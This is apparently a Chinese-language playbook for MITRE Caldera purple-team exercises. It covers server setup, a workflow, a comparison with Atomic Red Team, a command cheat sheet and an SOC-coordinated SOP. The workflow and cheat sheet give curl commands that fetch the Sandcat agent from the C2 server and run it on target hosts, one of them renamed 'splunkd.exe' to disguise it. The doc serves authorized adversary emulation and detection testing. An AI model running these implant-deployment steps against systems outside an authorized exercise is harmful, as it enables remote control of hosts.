# MITRE Caldera / 形态 B · 紫队闭环

> 上游入口：`SKILL.md` → 形态 B。
> 适用：多 agent 编排、自动跑一条完整 ATT&CK 链（adversary profile）、紫队复盘需要带 ops report。

## 必备组件

```text
□ Caldera server  — FastAPI，默认 localhost:8888
□ Sandcat agent   — Go binary，默认 HTTP heartbeat 通信
□ ATT&CK Navigator —（可选离线）
```

bootstrap：

```powershell
# 推荐 Docker（最快）
docker run -d --name caldera -p 7010:7010 -p 7011:7011 -p 8888:8888 mitre/caldera:latest

# 或 git clone（本地开发/定制）
git clone https://github.com/mitre/caldera.git --recursive %USERPROFILE%\Tools\caldera
cd %USERPROFILE%\Tools\caldera
pip install -r requirements.txt
python server.py --insecure
```

bootstrap manifest 中 caldera **canAutoInstall=false**（Docker pull 与 git clone 路径用户决定）。

---

## 工作流

```
1. 启动 server: docker run ... mitre/caldera   → http://localhost:8888 (red/admin)
2. 部署 sandcat agent 到目标主机:
   curl -s -X POST -H 'file:sandcat.go' -H 'platform:windows' \
     http://localhost:8888/file/download -o splunkd.exe
   ./splunkd.exe -server http://YOUR-CALDERA:8888 -group red
3. 选/写 adversary profile:
   - "Discovery" / "Hunter" / "Thief" 等内置 profile
   - 自定义：在 GUI 拖 abilities，每个 ability = 一个 Txxxx
4. 运行 operation: 选 profile + agent group + planner (atomic / batch / sequential)
5. 实时观察: 每个 ability 输出 success/failure；fact 自动传递 (user → host → cred)
6. 导出 ops report: JSON / SVG attack flow
7. report 转 Navigator layer: caldera 自带 plugin 'compass' → 'Generate Layer'
8. field-journal 回写 + diagram-generator 渲染
```

---

## 关键概念（与 Atomic 区别）

| 维度 | Atomic Red Team | Caldera |
|------|----------------|---------|
| 形态 | PowerShell 模块 | FastAPI server + Go agent |
| 单位 | atomic test (yaml) | ability (yaml) → adversary profile |
| 执行 | 单机一次性 | 多 agent 长期编排 |
| 状态传递 | 无 | facts (host/user/cred) 跨 ability 传递 |
| 输出 | log + 你自己整理 | 自带 ops report + attack flow SVG |
| 学习成本 | 低 | 高（plugin / planner / fact 概念多）|
| 适用 | 单技术验证 | 完整链路演练 |
| OPSEC | 直白 | sandcat 通信特征明显，但插件可定制 |

**绝不要把 Atomic 装在 Caldera 上跑** —— 是两套独立工具链。

---

## 命令速查

```bash
# 服务器侧 (Docker)
docker logs -f caldera

# REST API 看 ops 状态
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: ADMIN123" -H "Content-Type: application/json"

# Agent 侧 (Linux 目标)
curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' \
  http://CALDERA:8888/file/download -o agent
chmod +x agent && ./agent -server http://CALDERA:8888 -group red

# Plugin 'compass' 生成 Navigator layer
# Web UI → Plugins → compass → 选 operation → Download Layer
```

---

## 紫队 SOP

```text
□ T-1 day:  与 SOC 商定 adversary profile，明确战术清单
□ T-30 min: 启动 server，部署 agent
□ T+0:      启动 operation
□ 实时:     SOC 看 SIEM 中 sandcat 通信 + abilities 触发的告警
□ 收线:     pause operation → 导出 ops report → 停 operation
□ 必做:     删除 sandcat agent (-cleanup ability 或手动)
□ 复盘:     ops report + SOC 告警表 → ATT&CK 覆盖 vs 检出率热图
```

---

## 输出物

```
out/<operation-name>/
├── ops-report.json           # Caldera 导出
├── attack-flow.svg           # Caldera Compass 插件生成
├── attack-navigator-layer.json
└── field-journal-entry.md
```

---

## 参考

- [MITRE Caldera docs](https://caldera.mitre.org/)
- [Caldera Plugins (compass / atomic / etc.)](https://github.com/mitre/caldera/tree/master/plugins)
- [Adversary Profiles](https://caldera.readthedocs.io/en/latest/Plug-ins.html#stockpile)
